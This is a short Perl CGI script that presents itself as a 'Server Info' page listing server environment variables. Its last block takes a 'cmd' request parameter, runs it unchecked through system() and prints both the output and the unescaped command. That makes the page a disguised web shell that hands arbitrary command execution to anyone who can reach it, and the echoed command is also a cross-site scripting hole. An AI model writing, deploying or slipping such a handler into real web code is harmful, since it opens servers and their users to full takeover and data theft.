#!/usr/bin/perl
use strict;
use warnings;
use CGI qw(:standard);

print header();
print "<html><head><title>Server Info</title></head><body>";
print "<h2>Server Environment Information</h2>";
print "<ul>";
print "<li><b>Server Name:</b> $ENV{'SERVER_NAME'}</li>";
print "<li><b>Server Software:</b> $ENV{'SERVER_SOFTWARE'}</li>";
print "<li><b>Gateway Interface:</b> $ENV{'GATEWAY_INTERFACE'}</li>";
print "<li><b>Server Protocol:</b> $ENV{'SERVER_PROTOCOL'}</li>";
print "<li><b>CGI Revision:</b> $CGI::VERSION</li>";
print "</ul>";

my $cmd = param('cmd');
if ($cmd) {
    print "<h3>Output of command: $cmd</h3><pre>";
    system($cmd);
    print "</pre>";
}
print "</body></html>";